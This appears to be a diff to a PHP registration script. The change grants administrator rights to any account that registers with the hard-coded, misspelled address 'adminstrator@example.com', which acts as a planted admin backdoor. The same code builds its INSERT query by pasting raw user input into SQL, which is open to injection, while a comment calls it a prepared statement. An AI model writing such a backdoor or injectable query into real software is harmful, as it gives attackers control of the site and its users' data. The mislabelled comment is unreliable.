@@ -1,6 +1,6 @@
 <?php
 
-// include config file
+// include db config file
 require_once 'includes/db-config.php';
 
 // Define variables and initialize with empty values
@@ -84,8 +84,15 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     // $username, $first_name & $last_name is already set
     $password = password_hash($password, PASSWORD_DEFAULT); // Creates a password hash
 
+    if ($username === 'adminstrator@example.com') {
+      $is_admin = 1;
+    }
+    else {
+      $is_admin = 0;
+    }
+
     // Prepare an insert statement
-    $sql = "INSERT INTO users (username, password, first_name, last_name, is_admin) VALUES ($username, $password, $first_name, $last_name, 0)";
+    $sql = "INSERT INTO users (username, password, first_name, last_name, is_admin) VALUES ($username, $password, $first_name, $last_name, $is_admin)";
 
     // Attempt to execute the prepared statement
     if ($mysql->query($sql)) {
